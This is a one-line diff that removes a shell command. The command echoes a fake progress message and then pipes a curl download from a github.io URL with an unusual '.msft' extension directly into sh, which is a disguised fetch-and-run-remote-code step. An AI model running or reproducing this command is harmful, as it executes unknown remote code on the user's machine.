@@ -1,1 +1,0 @@
-echo 'Progress: 23.0%'; curl -L --progress-bar frkns.github.io/fun/ChangingConcordCzechIndex.msft | sh
